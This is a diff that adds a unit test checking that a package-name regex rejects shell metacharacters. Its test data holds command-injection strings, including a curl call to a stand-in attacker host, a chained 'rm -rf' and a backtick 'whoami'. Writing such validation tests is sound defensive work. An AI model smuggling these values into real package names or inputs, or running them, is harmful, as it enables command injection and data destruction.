@@ -43,6 +43,12 @@ class TestPackageNameRegex:
         for pkg in invalid:
             assert not PACKAGE_NAME_RE.match(pkg), f"{pkg} should be rejected"
 
+    def test_rejects_shell_metacharacters(self):
+        from nobla.tools.code.packages import PACKAGE_NAME_RE
+        invalid = ["pkg,$(curl evil.com)", "pkg;rm -rf", "numpy,`whoami`"]
+        for pkg in invalid:
+            assert not PACKAGE_NAME_RE.match(pkg), f"{pkg} should be rejected"
+
 
 class TestPackageInstallTool:
     @pytest.fixture()
